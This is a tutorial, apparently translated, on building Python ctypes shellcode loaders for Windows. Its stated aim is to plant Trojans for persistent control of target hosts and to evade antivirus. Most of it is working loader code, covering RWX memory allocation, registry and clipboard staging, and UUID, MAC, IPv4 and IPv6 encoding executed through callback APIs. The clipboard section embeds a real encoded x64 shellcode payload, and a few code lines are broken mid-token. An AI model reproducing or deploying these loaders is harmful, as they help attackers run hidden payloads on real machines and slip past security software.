# Penetration Test & ShellCode Loader

## Preface

​ During the penetration testing process, it is often necessary to use Trojans to launch the target host to achieve the purpose of persisting and conveniently controlling the target host. Because of its high plasticity and high difficulty in killing, the Trojan horse `shellcode` is usually changed and then it is not allowed to kill.

## ShellCode

​ `shellcode` is a hexadecimal machine code, which is an address-independent code. After the temporary storage EIP overflows, a piece of malicious code that can be executed by the CPU, thereby executing any instructions from the attacker. This is because when `shellcode` is written to memory, it will be translated into `CPU` instructions. `CPU` executes these instructions from top to bottom, and there is a special register, the `EIP` register. The value stored in it is the instruction address to the next execution of the `CPU` command. Therefore, you can execute `shellcode` by modifying the value of the `EIP` register.

## Preliminary exploration of ShellCode loader

Since `shellcode` is a string of executable binary code, it needs to be exploited by opening up a readable, writeable and executable area. This process is implemented using the `ctypes` library in the `python` language.

```python
# -*-coding:utf-8 -*-
"""
The ctypes library is a module in Python that calls the system dynamic link library functions. The ctypes library can use the C language dynamic link library and pass functions to it.
"""
import ctypes

shellcode = bytearray(b'')

# Use the resttype function to set the VirtualAlloc return type to ctypes.c_unit64, otherwise the default is 32-bit
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64

# Apply for memory, call the VirtualAlloc function in the kernel32.dll dynamic link library to apply for memory
ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0), # Pointer to the starting address of the area to be allocated. When the value is null, point to the system retains the area it considers suitable.
    ctypes.c_int(len(shellcode)), # The size of the allocated area
    ctypes.c_int(0x3000), # Type of memory allocation
    ctypes.c_int(0x40), # Memory protection of the page area to be allocated, readable, writeable, executable
)

# Call the RtlMoveMemory function in kernel32.dll dynamic link library to move the shellcode to the requested memory
buffer = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr), # Pointer to the target memory block to which the bytes are to be copied
    buffer, # Pointer to the source memory block from which to copy bytes
    ctypes.c_int(len(shellcode)) # Number of bytes copied from source to destination
)

# Create a thread to execute from the first address of the shellcode placement location
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.pointer(ctypes.c_int(0)), # Pointer to the SECURITY_ATTRIBUTES structure, thread safety attributes
    ctypes.c_int(0), # initial size of stack
    ctypes.c_void_p(ptr), # Pointer to application-defined function executed by thread
    ctypes.pointer(ctypes.c_int(0)), # Pointer to the variable to be passed to the thread
    ctypes.c_int(0), # Controls the flag created by the thread. If it is 0, it means that after creation, the thread will run immediately.
    ctypes.pointer(ctypes.c_int(0)) # Pointer to a variable that receives the thread identifier. If this parameter is NULL, the thread identifier will not be returned.
)

# Wait for the creation thread to complete
ctypes.windll.kernel32.WaitForSingleObject(
    ctypes.c_int(handle), # object handle
    ctypes.c_int(-1) # Timeout interval, set to a negative number in milliseconds, the waiting time will become infinite waiting, and the program will not end
)
```

![](img/1.png)

​ Here we add the `C` type and `Python` type corresponding to the `ctypes` type in the `ctypes` library.

![](img/2.png)

​ In the above, it is the most primitive way to apply for a readable, writable and executable memory by calling the `kernel32.dll` dynamic link library. With the change of soft-killing, it has become unavailable, and then a gradual loading mode appears. When reading in `shellcode`, apply for a normal readable and writeable memory page, and then modify its properties to executable through `VirtualProtect`.

```python
# -*-coding:utf-8 -*-
"""
The ctypes library is a module in Python that calls the system dynamic link library functions. The ctypes library can use the C language dynamic link library and pass functions to it.
In the most primitive way, use VirtualAlloc to apply for a readable, writable and executable memory page.
"""
import ctypes

shellcode = bytearray(b'')
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64

ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),
    ctypes.c_int(len(shellcode)),
    ctypes.c_int(0x3000),
    ctypes.c_int(0x04),
)

buffer = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.VirtualProtect(
    ptr,
    ctypes.c_int(len(shellcode)),
    0x40,
    ctypes.byref(ctypes.c_long(1))
)

ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buffer,
    ctypes.c_int(len(shellcode))
)

handle = ctypes.windll.kernel32.CreateThread(
    ctypes.pointer(ctypes.c_int(0)),
    ctypes.c_int(0),
    ctypes.c_void_p(ptr),
    ctypes.pointer(ctypes.c_int(0)),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0))
)

ctypes.windll.kernel32.WaitForSingleObject(
    ctypes.c_int(handle),
    ctypes.c_int(-1)
)
```

![](img/3.png)

## Explore new APIs

​ From the above study, we can see that the loading of `shellcode` is divided into `3` steps: apply for memory -> `shellcode` to write to memory (-> Modify memory properties) -> execute this memory. Some commonly used functions are basically killed by soft tags, so it is particularly important to find a new `API` to replace it.

### AllocADsMem+ReallocADsMem

- `AllocADsMem`: Used to allocate a memory block of a specified size.

```c++
LPVOID AllocADsMem(
  [in] DWORD cb
);
```

- `ReallocADsMem`: Used to reallocate and copy existing memory blocks.

```c++
LPVOID ReallocADsMem(
  [in] LPVOID pOldMem,
  [in] DWORD cbOld,
  [in] DWORD cbNew
);
```

`AllocADsMem` can allocate a readable, writable, but unexecutable memory block; `ReallocADsMem` can copy the specified content and apply for a new piece of memory for storage, but can only be copied from memory. Therefore, the idea of ​​using it is: first use `AllocADsMem` to allocate a readable, writable but unexecutable memory block, then use `ReallocADsMem` to copy the allocated memory blocks of `AllocADsMem`, and then use `VirtualProtect` to modify the memory protection constant to be readable, writable and executable.

```python
# -*-coding:utf-8 -*-
"""
The ctypes library is a module in Python that calls the system dynamic link library functions. The ctypes library can use the C language dynamic link library and pass functions to it.
AllocADsMem+ReallocADsMem+VirtualProtect
"""
import ctypes

shellcode = bytearray(b'')
ctypes.windll.Activeds.AllocADsMem.restype = c
types.c_uint64
ptr_alloc = ctypes.windll.Activeds.AllocADsMem(
    ctypes.c_int(len(shellcode))
)

ptr_realloc = ctypes.windll.Activeds.ReallocADsMem(
    ptr_alloc,
    len(shellcode),
    len(shellcode)
)

ctypes.windll.kernel32.VirtualProtect(
    ptr_realloc,
    ctypes.c_int(len(shellcode)),
    0x40,
    ctypes.byref(ctypes.c_long(1))
)

buffer = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr_realloc),
    buffer,
    ctypes.c_int(len(shellcode))
)

handle = ctypes.windll.kernel32.CreateThread(
    ctypes.pointer(ctypes.c_int(0)),
    ctypes.c_int(0),
    ctypes.c_void_p(ptr_realloc),
    ctypes.pointer(ctypes.c_int(0)),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0))
)

ctypes.windll.kernel32.WaitForSingleObject(
    ctypes.c_int(handle),
    ctypes.c_int(-1)
)
```

![](img/4.png)

### RtlCopyMemory

​ Based on the above using `AllocADsMem`+`ReallocADsMem` to replace `VirtualAlloc`, use `RtlCopyMemory` to replace `RtlMoveMemory`. Here, `ZwAllocateVirtualMemory` can also be used instead. The kernel-level `Zw` series API` is used to bypass the monitoring of the application layer. In the future, this method will be used to construct the `shellcode` constructor.

```python
# -*-coding:utf-8 -*-
"""
The ctypes library is a module in Python that calls the system dynamic link library functions. The ctypes library can use the C language dynamic link library and pass functions to it.
AllocADsMem+ReallocADsMem+VirtualProtect+RtlCopyMemory
"""
import ctypes

shellcode = bytearray(b'')
ctypes.windll.Activeds.AllocADsMem.restype = ctypes.c_uint64
ptr_alloc = ctypes.windll.Activeds.AllocADsMem(
    ctypes.c_int(len(shellcode))
)

ptr_realloc = ctypes.windll.Activeds.ReallocADsMem(
    ptr_alloc,
    len(shellcode),
    len(shellcode)
)

ctypes.windll.kernel32.VirtualProtect(
    ptr_realloc,
    ctypes.c_int(len(shellcode)),
    0x40,
    ctypes.byref(ctypes.c_long(1))
)

buffer = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlCopyMemory(
    ctypes.c_uint64(ptr_realloc),
    buffer,
    ctypes.c_int(len(shellcode))
)

handle = ctypes.windll.kernel32.CreateThread(
    ctypes.pointer(ctypes.c_int(0)),
    ctypes.c_int(0),
    ctypes.c_void_p(ptr_realloc),
    ctypes.pointer(ctypes.c_int(0)),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0))
)

ctypes.windll.kernel32.WaitForSingleObject(
    ctypes.c_int(handle),
    ctypes.c_int(-1)
)
```

![](img/5.png)

### RegSetValueExA+RegQueryValueExA

- `RegQueryValueExA`: Retrieves the type and data of the specified value name associated with the open registry key.

```c++
LSTATUS RegQueryValueExA(
  [in] HKEY hKey,
  [in, optional] LPCSTR lpValueName,
                      LPDWORD lpReserved,
  [out, optional] LPDWORD lpType,
  [out, optional] LPBYTE lpData,
  [in, out, optional] LPDWORD lpcbData
);
```

- `RegSetValueExA`: Sets the data type and type of the specified value under the registry key.

```c++
LSTATUS RegSetValueExA(
  [in] HKEY hKey,
  [in, optional] LPCSTR lpValueName,
                 DWORD Reserved,
  [in] DWORD dwType,
  [in] const BYTE *lpData,
  [in] DWORD cbData
);
```

​ Utilization idea: Since the registry can store binary content, use the `RegQueryValueExA` function to obtain the content in the registry, and write the `shellcode` into the registry content in combination with the `RegSetValueExA` function, allocate a piece of memory with `AllocADsMem` or `ReallocADsMem`, store the content read from the registry into the allocated memory, and then execute it.

```python
# -*-coding:utf-8 -*-
"""
The ctypes library is a module in Python that calls the system dynamic link library functions. The ctypes library can use the C language dynamic link library and pass functions to it.
AllocADsMem+ReallocADsMem+VirtualProtect+RtlCopyMemory
"""
import ctypes
from ctypes.wintypes import *

shellcode = b''

ctypes.windll.Activeds.AllocADsMem.restype = ctypes.POINTER(ctypes.c_byte)
ptr = ctypes.windll.Activeds.AllocADsMem(ctypes.c_int(len(shellcode)))
ctypes.windll.Advapi32.RegSetValueExA(
    -2147483647, # The handle of the open registry key
    "360LogFilePath", # The name of the value to be set, if the value with this name does not exist in the key, the function will add it to the key
    None, # This parameter is reserved and must be zero
    3, # The data type to which the data to be stored is pointed to, the value of REG_BINARY is 3
    shellcode, # data to be stored
    len(shellcode) # The size of the information to which the data to be stored
)
# lpcbData is the length of the shellcode. Here you need to execute RegQueryValueExA first to get the shellcode length, and then directly call RegQueryValueExA to read the requested memory
data_len = DWORD()
ctypes.windll.Advapi32.RegQueryValueExA(
    -2147483647, # The handle of the open registry key
    "360LogFilePath", # Name of the registry value
    0, # This parameter is reserved and must be NULL
    0, # Pointer to a variable that receives a code indicating the type of data stored in the specified value. If type code is not required, it can be NULL
    0, # Point to Receive
Pointer to the buffer of value data. If data is not needed, this parameter can be NULL
    ctypes.byref(data_len) # Pointer to a variable that specifies the size of the buffer to which the lpData parameter points
)
ctypes.windll.Advapi32.RegQueryValueExA(-2147483647, "360LogFilePath", 0, None, ptr, ctypes.byref(data_len))
# Delete the written registry
ctypes.windll.Advapi32.RegDeleteValueA(-2147483647, "360LogFilePath")
ctypes.windll.kernel32.VirtualProtect(ptr, ctypes.c_int(len(shellcode)), 0x40, ctypes.byref(ctypes.c_long(1)))
handle = ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))
```

![](img/6.png)

### GetClipboardFormatName+RegisterClipboardFormat

​ This method uses the clipboard function to register the clipboard format to write to `shellcode`. The API functions used are `GetClipboardFormatName` and `RegisterClipboardFormatA`.

- `RegisterClipboardFormatA`: Register a new clipboard format, which can be used as a valid clipboard format.

```c++
UINT RegisterClipboardFormatA(
  [in] LPCSTR lpszFormat
);
```

​ This function needs to pass in a parameter to use for the name of the new format.

- `GetClipboardFormatNameA`: Retrieve the name of the specified registration format from the clipboard and copy the name to the specified buffer.

```c++
int GetClipboardFormatNameA(
  [in] UINT format,
  [out] LPSTR lpszFormatName,
  [in] int cchMaxCount
);
```

​ This function needs to pass in three parameters. The first parameter is used to indicate the format type to be retrieved. This parameter must not specify any predefined clipboard format; the second parameter is used to indicate the buffer to receive the format name; the third parameter is used to indicate the maximum length of the string to be copied to the buffer. Note that if the name exceeds this limit, it will be truncated.

​ The idea of ​​utilization is also very clear: use the `RegisterClipboardFormatA` function to treat `shellcode` as the name of the registration format, register a new clipboard, and then use the `GetClipboardFormatNameA` function to obtain the name of the clipboard format, that is, `shellcode`, and write it to the requested memory. Here you need to note that the `\x00` character cannot appear in the `shellcode` to avoid the name of the registration format being truncated.

```python
# -*-coding:utf-8 -*-
"""
The ctypes library is a module in Python that calls the system dynamic link library functions. The ctypes library can use the C language dynamic link library and pass functions to it.
GetClipboardFormatName+RegisterClipboardFormat
"""
import ctypes

buf = b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d"
buf += b"\x05\xef\xff\xff\xff\x48\xbb\x96\x4d\x71\x7e\xfb"
buf += b"\x4f\x9f\x93\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
buf += b"\xff\xe2\xf4\x6a\x05\xf2\x9a\x0b\xa7\x5f\x93\x96"
buf += b"\x4d\x30\x2f\xba\x1f\xcd\xc2\xc0\x05\x40\xac\x9e"
buf += b"\x07\x14\xc1\xf6\x05\xfa\x2c\xe3\x07\x14\xc1\xb6"
buf += b"\x05\xfa\x0c\xab\x07\x90\x24\xdc\x07\x3c\x4f\x32"
buf += b"\x07\xae\x53\x3a\x71\x10\x02\xf9\x63\xbf\xd2\x57"
buf += b"\x84\x7c\x3f\xfa\x8e\x7d\x7e\xc4\x0c\x20\x36\x70"
buf += b"\x1d\xbf\x18\xd4\x71\x39\x7f\x2b\xc4\x1f\x1b\x96"
buf += b"\x4d\x71\x36\x7e\x8f\xeb\xf4\xde\x4c\xa1\x2e\x70"
buf += b"\x07\x87\xd7\x1d\x0d\x51\x37\xfa\x9f\x7c\xc5\xde"
buf += b"\xb2\xb8\x3f\x70\x7b\x17\xdb\x97\x9b\x3c\x4f\x32"
buf += b"\x07\xae\x53\x3a\x0c\xb0\xb7\xf6\x0e\x9e\x52\xae"
buf += b"\xad\x04\x8f\xb7\x4c\xd3\xb7\x9e\x08\x48\xaf\x8e"
buf += b"\x97\xd7\x1d\x0d\x55\x37\xfa\x9f\xf9\xd2\x1d"
buf += b"\x41\x39\x3a\x70\x0f\x83\xda\x97\x9d\x30\xf5\xff"
buf += b"\xc7\xd7\x92\x46\x0c\x29\x3f\xa3\x11\xc6\xc9\xd7"
buf += b"\x15\x30\x27\xba\x15\xd7\x10\x7a\x6d\x30\x2c\x04"
buf += b"\xaf\xc7\xd2\xcf\x17\x39\xf5\xe9\xa6\xc8\x6c\x69"
buf += b"\xb2\x2c\x36\x41\x4e\x9f\x93\x96\x4d\x71\x7e\xfb"
buf += b"\x07\x12\x1e\x97\x4c\x71\x7e\xba\xf5\xae\x18\xf9"
buf += b"\xca\x8e\xab\x40\xaf\x82\xb9\x9c\x0c\xcb\xd8\x6e"
buf += b"\xf2\x02\x6c\x43\x05\xf2\xba\xd3\x73\x99\xef\x9c"
buf += b"\xcd\x8a\x9e\x8e\x4a\x24\xd4\x85\x3f\x1e\x14\xfb"
buf += b"\x16\xde\x1a\x4c\xb2\xa4\x1d\x9a\x23\xfc\xbd\xf3"
buf += b"\x35\x14\x7e\xfb\x4f\x9f\x93"

# Apply for memory
ctypes.windll.Activeds.AllocADsMem.restype = ctypes.c_uint64
ptr = ctypes.windll.Activeds.AllocADsMem(ctypes.c_int(len(buf)))
ctypes.windll.kernel32.VirtualProtect(ptr, ctypes.c_int(len(buf)), 0x40, ctypes.byref(ctypes.c_long(1)))
# Register a new clipboard format
clipboard_name = ctypes.windll.user32.RegisterClipboardFormatW(buf)
# Retrieve the name of the specified registration format from the clipboard and copy the name to the specified buffer
ctypes.windll.user32.GetClipboardFormatNameW(clipboard_name, ptr, len(buf))
# Callback function calls shellcode
ctypes.windll.kernel32.EnumSystemLocalesW(ptr, 0)
```

![](img/15.png)

### UUID memory loading

​ The method of writing `shellcode` into memory using `UUID` has appeared very early. In `Python`, the `uuid.UUID` function accepts a `16-byte byte`. When the remaining bytes are less than `16`, you can add `\x00` to supplement the number of bytes. Let’s take a look at how to write `UUID` to memory.

- `UuidFromStringA`: Used to convert a string to `UUID`.

```c++
RPC_STATUS UuidFromStringA(
  RPC_CSTR StringUuid,
  UUID *Uuid
);
```

​ This `API` calls the dynamic link library `Rpcrt4`, and two parameters need to be passed in. The first is a pointer to the `UUID` string, and the second is a pointer to an area in memory, `UUID`
The form of `shellcode` is converted into binary and written into this memory area.

- `heapCreate`: Used to create a dedicated heap object that can be used by the calling process. This function reserves space in the process's virtual address space and allocates physical storage for the specified initial part of this block.

```c++
HANDLE HeapCreate(
  [in] DWORD flOptions,
  [in] SIZE_T dwInitialSize,
  [in] SIZE_T dwMaximumSize
);
```

​ This `API` requires three parameters to be passed in. The first parameter is used to set the heap allocation option. It is set to `HEAP_CREATE_ENABLE_EXECUTE` here, allowing all memory blocks allocated by the heap to execute code; the second parameter is used to set the initial size of the heap. When the parameter is `0`, a page will be submitted, and it is set to `0` here; the third parameter is used to set the maximum size of the heap. If `dwMaximumSize` is not zero, the heap size is fixed and cannot exceed the maximum size. If `dwMaximumSize` is `0`, the heap can be increased in size, and it is also set to `0` here.

- `ZwAllocateVirtualMemory`: The `ZwAllocateVirtualMemory` routine retains, submits, or retains a region's page in the user-mode virtual address space of the specified process.

```c++
NTSYSAPI NTSTATUS ZwAllocateVirtualMemory(
  [in] HANDLE ProcessHandle,
  [in, out] PVOID *BaseAddress,
  [in] ULONG_PTR ZeroBits,
  [in, out] PSIZE_T RegionSize,
  [in] ULONG AllocationType,
  [in] ULONG Protect
);
```

​The `API` requires six parameters to be passed in. The first parameter is used to set the process handle for executing the mapping, which is set to the result returned by `HeapCreate`; the second parameter is used to point to a variable that will receive the base address of the assigned page area. If the initial value of this parameter is `NULL`, the operating system will determine the location of the allocated area, which is set to `NULL` here; the third parameter must be less than `21` and it is only used when the operating system determines the location of the allocated area. The old setting is `NULL`; the fourth parameter is used to point to a variable that will receive the actual size of the assigned page area. Note that the size of the requested memory should be `len(shellcode)*16`; the fifth parameter is used to specify the bitmask of the flag of the allocation type to be executed, here is set to `MEM_COMMIT`; the sixth parameter is used to specify the protection required for the submitted page area, here is set to `PAGE_EXECUTE_READWRITE`.

​ Finally, the `callback` method is used to trigger the execution of `shellcode` in memory. For the API that executes `shellcode` through function callback, you can view it in the project `AlternativeShellcodeExec`: https://github.com/aahmad097/AlternativeShellcodeExec.

```python
# -*-coding:utf-8 -*-
"""
The ctypes library is a module in Python that calls the system dynamic link library functions. The ctypes library can use the C language dynamic link library and pass functions to it.
UUID memory loading (this version does not use heapCreate+ZwAllocateVirtualMemory)
"""
import uuid
import ctypes

def UUIDConvert(shellcode):
    uuid_shellcode = []
    if len(shellcode) % 16 != 0:
        null_byte = b'\x00' * (16 - len(shellcode) % 16)
        shellcode += null_byte

    for i in range(0, len(shellcode), 16):
        uuid_string = str(uuid.UUID(bytes_le=shellcode[i: i + 16]))
        uuid_shellcode.append(uuid_string)
    return uuid_shellcode


shellcode = b''
uuid_shellcode = UUIDConvert(shellcode=shellcode)
print(uuid_shellcode)

ctypes.windll.Activeds.AllocADsMem.restype = ctypes.c_uint64
ptr_alloc = ctypes.windll.Activeds.AllocADsMem(ctypes.c_int(len(shellcode)))
ptr_realloc = ctypes.windll.Activeds.ReallocADsMem(ptr_alloc, len(shellcode), len(shellcode))
ctypes.windll.kernel32.VirtualProtect(ptr_realloc, ctypes.c_int(len(shellcode)), 0x40, ctypes.byref(ctypes.c_long(1)))

ptr = ptr_realloc
for code in uuid_shellcode:
    ctypes.windll.Rpcrt4.UuidFromStringA(code, ptr)
    ptr += 16

ctypes.windll.kernel32.EnumSystemLocalesW(ptr_realloc, 0)
```

![](img/7.png)

### MAC memory loading

​ The above uses the use of `UUID` to write `shellcode` into memory by calling the `API` function. Using the same idea, if a certain `API` function can be found to implement some reversible deformation and finally written to a binary pointer, then memory loading can also be implemented. Here we find the `RtlEthernetAddressToStringA` function and the `RtlEthernetStringToAddressA` function.

- `RtlEthernetAddressToString`: `RtlEthernetAddressToString` function converts a binary Ethernet address into a string representation of the Ethernet `MAC` address.

```c++
NTSYSAPI PSTR RtlEthernetAddressToStringA(
  [in] const DL_EUI48 *Addr,
  [out] PSTR S
);
```

​ The API function requires two parameters. The first parameter is an Ethernet address in binary format; the second parameter is a pointer to the buffer, which is used to store the `NULL` terminating string representation of the Ethernet address, and the size of this buffer should be sufficient to accommodate at least `18` characters. Note that the return value is a pointer to the `NULL` character inserted at the end of the string representation of the Ethernet `MAC` address.

- `RtlEthernetStringToAddressA`: `RtlEthernetStringToAddress` function converts the string representation of the Ethernet `MAC` address into a binary format of the Ethernet address.

```c++
NTSYSAPI NTSTATUS RtlEthernetStringToAddressA(
  [in] PCSTR S,
  [out] PCSTR *Terminator,
  [out] DL_EUI48 *Addr
);
```

​ This `API` function can convert the string of the previously converted Ethernet `MAC` address into `shellcode` and write it into memory. The API function requires three parameters. The first parameter is a pointer to a buffer containing the `NULL` terminating string representation of the Ethernet `MAC` address; the second parameter is used to receive a pointer to a character that terminates the conversion string; the third parameter is a pointer, storing the binary representation of the Ethernet `MAC` address.

```python
# -*-coding:utf-8 -*-
"""
The ctypes library is a module in Python that calls the system dynamic link library functions. The ctypes library can use the C language dynamic link library and pass functions to it.
MAC memory loading
"""
import ctypes

shellcode = b''
if len(shellcode) % 16 != 0:
    null_byte = b'\x00' * (16 - len(shellcode) % 16)
    shellcode += null_byte

ctypes.windll.Activeds.AllocADsMem.restype = ctypes.c_uint64
ptr_alloc_1 = ctypes.windll.Activeds.AllocADsMem(ctypes.c_int(len(shellcode) // 6 * 17))
ptr_realloc_1 = ctypes.windll.Activeds.ReallocADsMem(ptr_alloc_1, len(shellcode) // 6 * 17, len(shellcode) // 6 * 17)
ctypes.windll.kernel32.VirtualProtect(ptr_realloc_1,
ctypes.c_int(len(shellcode) // 6 * 17), 0x40, ctypes.byref(ctypes.c_long(1)))

for i in range(len(shellcode) // 6):
    bytes_shellcode = shellcode[i * 6: 6 + i * 6]
    ctypes.windll.Ntdll.RtlEthernetAddressToStringA(bytes_shellcode, ptr_realloc_1 + i * 17)

mac_list = []
for i in range(len(shellcode) // 6):
    mac = ctypes.string_at(ptr_realloc_1 + i * 17, 17)
    mac_list.append(mac)
print(mac_list)

ptr_alloc_2 = ctypes.windll.Activeds.AllocADsMem(ctypes.c_int(len(mac_list) * 6))
ptr_realloc_2 = ctypes.windll.Activeds.ReallocADsMem(ptr_alloc_1, len(mac_list) * 6, len(mac_list) * 6)
ctypes.windll.kernel32.VirtualProtect(ptr_realloc_2, ctypes.c_int(len(mac_list) * 6), 0x40, ctypes.byref(ctypes.c_long(1)))

rwxpage = ptr_realloc_2
for i in range(len(mac_list)):
    ctypes.windll.Ntdll.RtlEthernetStringToAddressA(mac_list[i], mac_list[i], rwxpage)
    rwxpage += 6

ctypes.windll.kernel32.EnumSystemLocalesW(ptr_realloc_2, 0)
```

![](img/8.png)

### IPv4 memory loading

​ With the same idea as above, using the `IPV4` method to implement memory loading, you can use the `API` function in `ip2string.h`, where you use the `RtlIpv4AddressToStringA` function and `RtlIpv4StringToAddressA` function.

- `RtlIpv4StringToAddressA`: `RtlIpv4StringToAddress` function converts the string representation of the `IPv4` address to a binary `IPv4` address.

```c++
NTSYSAPI NTSTATUS RtlIpv4StringToAddressA(
  [in] PCWSTR S,
  [in] BOOLEAN Strict,
  [out] LPCWSTR *Terminator,
  [out] in_addr *Addr
);
```

![](img/9.png)

- `RtlIpv4AddressToStringA`: `RtlIpv4AddressToString` function converts the `IPv4` address to a string in the `Internet` standard dot decimal format.

```c++
NTSYSAPI PWSTR RtlIpv4AddressToStringA(
  [in] const in_addr *Addr,
  [out] PWSTR S
);
```

![](img/10.png)

```python
# -*-coding:utf-8 -*-
"""
The ctypes library is a module in Python that calls the system dynamic link library functions. The ctypes library can use the C language dynamic link library and pass functions to it.
IPv4 memory loading
"""
import ctypes

shellcode = b''
if len(shellcode) % 4 != 0:
    null_byte = b'\x00' * (4 - len(shellcode) % 4)
    shellcode += null_byte

ctypes.windll.Activeds.AllocADsMem.restype = ctypes.c_uint64
ptr_alloc_1 = ctypes.windll.Activeds.AllocADsMem(ctypes.c_int(len(shellcode) // 4 * 16))
ptr_realloc_1 = ctypes.windll.Activeds.ReallocADsMem(ptr_alloc_1, len(shellcode) // 4 * 16, len(shellcode) // 4 * 16)
ctypes.windll.kernel32.VirtualProtect(ptr_realloc_1, ctypes.c_int(len(shellcode) // 4 * 16), 0x40, ctypes.byref(ctypes.c_long(1)))

for i in range(len(shellcode) // 4):
    bytes_shellcode = shellcode[i * 4: 4 + i * 4]
    ctypes.windll.Ntdll.RtlIpv4AddressToStringA(bytes_shellcode, ptr_realloc_1 + i * 16)

ipv4_list = []
for i in range(len(shellcode) // 4):
    ipv4 = ctypes.string_at(ptr_realloc_1 + i * 16, 16)
    ipv4_list.append(ipv4)
print(ipv4_list)

ptr_alloc_2 = ctypes.windll.Activeds.AllocADsMem(ctypes.c_int(len(shellcode)))
ptr_realloc_2 = ctypes.windll.Activeds.ReallocADsMem(ptr_alloc_1, len(shellcode), len(shellcode))
ctypes.windll.kernel32.VirtualProtect(ptr_realloc_2, ctypes.c_int(len(shellcode)), 0x40, ctypes.byref(ctypes.c_long(1)))

rwxpage = ptr_realloc_2
for i in range(len(ipv4_list)):
    ctypes.windll.Ntdll.RtlIpv4StringToAddressA(ipv4_list[i], False, ipv4_list[i], rwxpage)
    rwxpage += 4

ctypes.windll.kernel32.EnumSystemLocalesW(ptr_realloc_2, 0)
```

![](img/11.png)

### IPv6 memory loading

Still like the above, the memory loading is implemented using the `IPV6` method, using the `RtlIpv6AddressToStringA` function and the `RtlIpv6StringToAddressA` function.

- `RtlIpv6AddressToStringA`: `RtlIpv6AddressToString` function converts `IPv6` addresses into strings in the `Internet` standard format.

```c++
NTSYSAPI PSTR RtlIpv6AddressToStringA(
  [in] const in6_addr *Addr,
  [out] PSTR S
);
```

![](img/13.png)

- `RtlIpv6StringToAddressA`: `RtlIpv6StringToAddress` function converts the string representation of the `IPv6` address to a binary `IPv6` address.

```c++
NTSYSAPI NTSTATUS RtlIpv6StringToAddressA(
  [in] PCSTR S,
  [out] PCSTR *Terminator,
  [out] in6_addr *Addr
);
```

![](img/14.png)

```python
# -*-coding:utf-8 -*-
"""
The ctypes library is a module in Python that calls the system dynamic link library functions. The ctypes library can use the C language dynamic link library and pass functions to it.
IPv6 memory loading
"""
import ctypes

shellcode = b''
if len(shellcode) % 16 != 0:
    null_byte = b'\x00' * (16 - len(shellcode) % 16)
    shellcode += null_byte

ctypes.windll.Activeds.AllocADsMem.restype = ctypes.c_uint64
ptr_alloc_1 = ctypes.windll.Activeds.AllocADsM
em(ctypes.c_int(len(shellcode) // 16 * 40))
ptr_realloc_1 = ctypes.windll.Activeds.ReallocADsMem(ptr_alloc_1, len(shellcode) // 16 * 40, len(shellcode) // 16 * 40)
ctypes.windll.kernel32.VirtualProtect(ptr_realloc_1, ctypes.c_int(len(shellcode) // 16 * 40), 0x40, ctypes.byref(ctypes.c_long(1)))

for i in range(len(shellcode) // 16):
    bytes_shellcode = shellcode[i * 16: 16 + i * 16]
    ctypes.windll.Ntdll.RtlIpv6AddressToStringA(bytes_shellcode, ptr_realloc_1 + i * 40)

ipv6_list = []
for i in range(len(shellcode) // 16):
    ipv6 = ctypes.string_at(ptr_realloc_1 + i * 40, 40)
    ipv6_list.append(ipv6)
print(ipv6_list)

ptr_alloc_2 = ctypes.windll.Activeds.AllocADsMem(ctypes.c_int(len(shellcode)))
ptr_realloc_2 = ctypes.windll.Activeds.ReallocADsMem(ptr_alloc_1, len(shellcode), len(shellcode))
ctypes.windll.kernel32.VirtualProtect(ptr_realloc_2, ctypes.c_int(len(shellcode)), 0x40, ctypes.byref(ctypes.c_long(1)))

rwxpage = ptr_realloc_2
for i in range(len(ipv6_list)):
    ctypes.windll.Ntdll.RtlIpv6StringToAddressA(ipv6_list[i], ipv6_list[i], rwxpage)
    rwxpage += 16

ctypes.windll.kernel32.EnumSystemLocalesW(ptr_realloc_2, 0)
```

![](img/12.png)

## refer to

- [XG Xiaogang](https://forum.butian.net/index.php/people/4733/community)
- [MSDN](https://learn.microsoft.com/zh-cn/)